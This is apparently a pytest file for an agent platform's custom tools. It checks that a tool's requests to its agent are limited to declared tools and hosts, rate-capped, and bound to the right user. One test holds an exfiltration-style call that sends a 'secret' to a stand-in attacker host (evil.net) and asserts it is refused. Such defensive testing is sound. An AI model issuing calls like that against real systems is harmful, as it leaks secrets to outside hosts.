# ruff: noqa: F811 — `data`, `deck` and `as_agent` are fixtures imported from the other Custom tools tests
"""Custom tools, Phase 7a: a running tool asks the agent that ran it to use one
of its tools, over a private line (the `captain` helper). Flight Deck checks
each request against what the tool declared; publishing answers from the
examples' recorded replies; the agent acts only for a run it is waiting on."""

from __future__ import annotations

import json
import os
import sys
from pathlib import Path

import pytest

from captain_claw import custom_tool_callbacks, speaker
from captain_claw.flight_deck import external_tools as xt
from captain_claw.flight_deck import external_tools_routes as xr
from captain_claw.tools.registry import ToolResult

from .test_external_tools import _commit, _manifest, _switch_on, data, deck  # noqa: F401
from .test_external_tools_agent import _agent_client, as_agent  # noqa: F401

pytestmark = pytest.mark.skipif(sys.platform.startswith("win"), reason="the line to the agent is POSIX only")

RATES = """import json, sys
import captain
data = json.load(sys.stdin)
page = captain.tool("web_fetch", url=data.get("url", "https://api.example.com/rates"))
try:
    captain.tool("shell", command="ls")
    refused = ""
except captain.Refused as exc:
    refused = str(exc)
print(json.dumps({"page": page["content"], "ok": page["ok"], "refused": refused}))
"""
USES = [{"tool": "web_fetch", "hosts": ["api.example.com"], "why": "reads the rates"}]
RECORDED = [{"input": {}, "expect": {"page": "EUR 1.08"},
             "calls": [{"tool": "web_fetch", "reply": {"ok": True, "content": "EUR 1.08"}}]}]


class FakeLink(xt.Link):
    """The agent, as a test sees it: what it was asked, and what it answers."""

    def __init__(self, content: str = "from the agent", files: dict[str, Path] | None = None) -> None:
        self.asked: list[tuple[str, dict]] = []
        self.content = content
        self.files = files or {}

    async def tool(self, ctx, name, params):
        self.asked.append((name, params))
        return {"ok": True, "content": self.content}

    async def file(self, ctx, ref):
        return xt._bring_in(ctx, self.files[ref], Path(ref).name)


async def _tool(uid: str, slug: str, main_py: str, **manifest) -> dict:
    await xt.create_tool(uid, slug, title=slug.title(), description="A test tool.")
    _commit(uid, slug, {"main.py": main_py, "tool.json": _manifest(slug, **manifest), "tests/test_main.py": None})
    return await xt.publish(uid, slug, by=uid)


async def test_a_tool_asks_its_agent_and_undeclared_asks_are_refused(data):
    state = await _tool("u1", "rates", RATES, uses=USES, examples=RECORDED)
    assert state["state"] == "passed", state
    vdir = xt.versions_dir("u1", "rates") / state["version"]
    assert (vdir / "captain.py").read_text() == xt._HELPER.read_text()  # Flight Deck's own copy
    link = FakeLink("EUR 1.10")
    res = await xt.run_tool("u1", "rates", "u1", {}, link=link)
    assert res["ok"], res
    assert res["output"]["page"] == "EUR 1.10"
    assert "isn't in this tool's uses" in res["output"]["refused"]
    # Only the declared request reached the agent.
    assert link.asked == [("web_fetch", {"url": "https://api.example.com/rates"})]


async def test_a_host_it_didnt_name_never_reaches_the_agent(data):
    assert (await _tool("u1", "rates", RATES, uses=USES, examples=RECORDED))["state"] == "passed"
    main = """import json, captain
try:
    captain.tool("web_fetch", url="https://evil.net/?secret=1")
    print(json.dumps({"r": "asked"}))
except captain.Refused as exc:
    print(json.dumps({"r": str(exc)}))
"""
    _commit("u1", "rates", {"main.py": main,
                            "tool.json": _manifest("rates", uses=USES, examples=[{"input": {}}])})
    assert (await xt.publish("u1", "rates", by="u1"))["state"] == "passed"
    link = FakeLink()
    res = await xt.run_tool("u1", "rates", "u1", {}, link=link)
    assert "isn't on this tool's hosts" in res["output"]["r"] and link.asked == []


async def test_without_an_agent_it_doesnt_run(data):
    assert (await _tool("u1", "rates", RATES, uses=USES, examples=RECORDED))["state"] == "passed"
    with pytest.raises(xt.ToolError) as exc:
        await xt.run_tool("u1", "rates", "u1", {})
    assert exc.value.kind == "needs_agent" and exc.value.status == 409


async def test_publishing_answers_from_the_recorded_replies(data):
    # No recorded reply: the example fails and says what was asked.
    state = await _tool("u1", "rates", RATES, uses=USES, examples=[{"input": {}}])
    assert state["state"] == "failed"
    assert "no recorded reply left" in state["steps"][-1]["detail"]
    # A recorded reply that wasn't asked for fails it too.
    extra = [{**RECORDED[0], "calls": [*RECORDED[0]["calls"], {"tool": "web_fetch", "reply": {"ok": True}}]}]
    _commit("u1", "rates", {"tool.json": _manifest("rates", uses=USES, examples=extra)})
    state = await xt.publish("u1", "rates", by="u1")
    assert state["state"] == "failed" and "weren't asked for" in state["steps"][-1]["detail"]
    # Recorded calls are checked as tool.json is.
    _commit("u1", "rates", {"tool.json": _manifest("rates", uses=USES, examples=[{"input": {}, "calls": [{"x": 1}]}])})
    state = await xt.publish("u1", "rates", by="u1")
    assert state["state"] == "failed" and "recorded call names one of" in state["error"]


async def test_files_cross_both_ways(data, tmp_path):
    main = """import json, os, captain
src = captain.vfs_file("vfs:reports/march.csv")
rows = open(src).read().splitlines()
out = os.path.join(os.environ["XT_OUT"], "sum.txt")
open(out, "w").write(str(len(rows)))
done = captain.tool("write", path="vfs:reports/sum.txt", content=captain.file(out))
print(json.dumps({"rows": len(rows), "ok": done["ok"]}))
"""
    uses = [{"tool": "read", "why": "reads the report"}, {"tool": "write", "why": "saves the sum"}]
    fixtures = {"tests/fixtures/march.csv": "a\nb\nc\n"}
    await xt.create_tool("u1", "sum", title="Sum", description="A test tool.")
    example = {"input": {}, "expect": {"rows": 3},
               "calls": [{"file": "vfs:reports/march.csv", "path": "tests/fixtures/march.csv"},
                         {"tool": "write", "reply": {"ok": True}}]}
    _commit("u1", "sum", {"main.py": main, "tool.json": _manifest("sum", uses=uses, examples=[example]),
                          "tests/test_main.py": None, **fixtures})
    assert (await xt.publish("u1", "sum", by="u1"))["state"] == "passed"
    csv = tmp_path / "march.csv"
    csv.write_text("1\n2\n3\n4\n")
    link = FakeLink(files={"vfs:reports/march.csv": csv})
    res = await xt.run_tool("u1", "sum", "u1", {}, link=link)
    assert res["output"] == {"rows": 4, "ok": True}, res
    (name, params), = link.asked
    assert name == "write" and isinstance(params["content"], xt.HandedFile)
    assert params["content"].path.name == "sum.txt"
    # A file outside the run can't be handed on.
    ctx = xt.CallContext(owner="u1", slug="sum", title="Sum", version="v", caller="u1", call_id="xc_1",
                         call_dir=tmp_path / "run", manifest=xt.manifest_of("u1", "sum"), deadline=0)
    (tmp_path / "run").mkdir()
    with pytest.raises(xt.ToolError, match="only a file this run wrote"):
        xt._mark_files(ctx, {"content": {"$file": str(csv)}})


async def test_a_run_makes_at_most_fifty_requests(data):
    main = """import json, captain
n = 0
for _ in range(60):
    try:
        captain.tool("write", path="x", content="y")
        n += 1
    except captain.Refused:
        break
print(json.dumps({"n": n}))
"""
    example = {"input": {}, "calls": [{"tool": "write", "reply": {"ok": True}}] * 50}
    state = await _tool("u1", "many", main, uses=[{"tool": "write", "why": "x"}], examples=[example])
    assert state["state"] == "passed", state
    res = await xt.run_tool("u1", "many", "u1", {}, link=FakeLink())
    assert res["output"] == {"n": 50}


async def test_the_helper_answers_from_xt_fake_calls_in_tests(data):
    test_py = """import json, os, subprocess, sys, tempfile, unittest
from pathlib import Path
TOOL = Path(__file__).resolve().parent.parent
class T(unittest.TestCase):
    def test_rates(self):
        with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False) as fh:
            json.dump([{"tool": "web_fetch", "reply": {"ok": True, "content": "EUR 2"}},
                       {"tool": "shell", "reply": {"refused": True, "error": "not declared"}}], fh)
        env = {**os.environ, "XT_FAKE_CALLS": fh.name}
        done = subprocess.run([sys.executable, str(TOOL / "main.py")], input="{}", capture_output=True, text=True,
                              env=env, cwd=TOOL, check=True)
        out = json.loads(done.stdout)
        self.assertEqual((out["page"], out["refused"]), ("EUR 2", "not declared"))
"""
    await xt.create_tool("u1", "rates", title="Rates", description="A test tool.")
    _commit("u1", "rates", {"main.py": RATES, "tool.json": _manifest("rates", uses=USES, examples=RECORDED,
                                                                   test=["-m", "unittest", "discover", "-s", "tests"]),
                            "tests/test_main.py": test_py})
    state = await xt.publish("u1", "rates", by="u1")
    assert state["state"] == "passed", state["steps"]
    assert "Ran 1 test" in next(s for s in state["steps"] if s["step"] == "tests")["detail"]


def test_new_tools_and_crew_worktrees_get_the_helper(tmp_path):
    starter = xt._starter("t", "T", "d")
    assert starter["captain.py"] == xt._HELPER.read_text()
    assert xt.place_helper(tmp_path) is True and xt.place_helper(tmp_path) is False
    (tmp_path / "captain.py").write_text("old")
    assert xt.place_helper(tmp_path) is True and (tmp_path / "captain.py").read_text() == xt._HELPER.read_text()
    assert "captain.tool" in xt.WORKER_CONTRACT and "XT_FAKE_CALLS" in xt.WORKER_CONTRACT


# ── Through Flight Deck's agent route, to the agent's own handler ────────


class StubAgent:
    """An agent instance: runs a tool through its guarded path."""

    def __init__(self) -> None:
        self.ran: list[tuple[str, dict, str, object]] = []

    async def _execute_tool_with_guard(self, name, arguments, interaction_label="", session_id_override=None, **_):
        self.ran.append((name, arguments, interaction_label, speaker.current()))
        return ToolResult(success=True, content=f"{name} done for {session_id_override}")


@pytest.fixture
def agent_side(monkeypatch):
    """The agent's /api/custom-tools/callback, reached in-process."""
    custom_tool_callbacks.reset_for_tests()
    sent: list[dict] = []

    async def post(self, body, timeout):
        sent.append(body)
        status, answer = await custom_tool_callbacks.handle(body)
        if status != 200:
            raise xt.ToolError("agent_refused", answer.get("error", ""))
        return answer

    monkeypatch.setattr(xr.AgentLink, "_post", post)
    yield sent
    custom_tool_callbacks.reset_for_tests()


async def test_an_agent_run_reaches_the_agent_that_ran_it(deck, as_agent, agent_side):
    await _switch_on(deck)
    owner = deck.user["id"]
    as_agent["owner"] = owner
    assert (await _tool(owner, "rates", RATES, uses=USES, examples=RECORDED))["state"] == "passed"
    stub = StubAgent()
    cb = custom_tool_callbacks.open_wait(stub, "chat-1", tool="rates")
    async with _agent_client() as c:
        old = await c.post("/fd/external-tools/agent/run", json={"tool": "rates", "input": {}})
        assert old.status_code == 409 and "restart the agent" in old.json()["detail"]
        res = await c.post("/fd/external-tools/agent/run", json={"tool": "rates", "input": {}, "callback": cb})
    assert res.status_code == 200, res.text
    assert res.json()["output"]["page"] == "web_fetch done for chat-1"
    (body,) = agent_side
    assert body["identity"] == {"user_id": owner, "member": False, "grant": "", "owner_runs": True}
    assert stub.ran[0][:3] == ("web_fetch", {"url": "https://api.example.com/rates"}, "custom_tool:rates")


async def test_the_agent_acts_only_for_a_run_it_waits_on():
    custom_tool_callbacks.reset_for_tests()
    stub = StubAgent()
    ask = {"op": "tool", "tool": "read", "input": {"path": "x"}, "identity": {"member": False}}
    assert (await custom_tool_callbacks.handle({**ask, "callback": "nope"}))[0] == 404
    cb = custom_tool_callbacks.open_wait(stub, "s", tool="t")
    assert (await custom_tool_callbacks.handle({**ask, "callback": cb, "tool": "custom_tools"}))[0] == 403
    assert (await custom_tool_callbacks.handle({**ask, "callback": cb, "identity": {"member": True}}))[0] == 403
    status, answer = await custom_tool_callbacks.handle({**ask, "callback": cb})
    assert status == 200 and answer["ok"] and stub.ran[0][3] is None
    custom_tool_callbacks.close_wait(cb)
    assert (await custom_tool_callbacks.handle({**ask, "callback": cb}))[0] == 404


async def test_a_members_request_runs_as_that_member():
    custom_tool_callbacks.reset_for_tests()
    stub = StubAgent()
    member = speaker.Principal(speaker_id="m1", display_name="Mia", owner_name="Ana", lane="A",
                               agent_ref="process:helper:0123456789abcdef")
    grant = "g" * 43
    p_tok, g_tok = speaker.bind(member), speaker.bind_grant(grant)
    try:
        cb = custom_tool_callbacks.open_wait(stub, "member-chat", tool="rates")
    finally:
        speaker.reset_grant(g_tok)
        speaker.reset(p_tok)
    ask = {"callback": cb, "op": "tool", "tool": "read", "input": {"path": "x"}}
    wrong = {"member": True, "user_id": "someone-else", "grant": grant}
    assert (await custom_tool_callbacks.handle({**ask, "identity": wrong}))[0] == 403
    assert (await custom_tool_callbacks.handle({**ask, "identity": {**wrong, "user_id": "m1", "grant": "h" * 43}}))[0] == 403
    status, _ = await custom_tool_callbacks.handle({**ask, "identity": {"member": True, "user_id": "m1", "grant": grant}})
    assert status == 200 and stub.ran[0][3] == member
    assert speaker.current() is None  # bound for that one call only

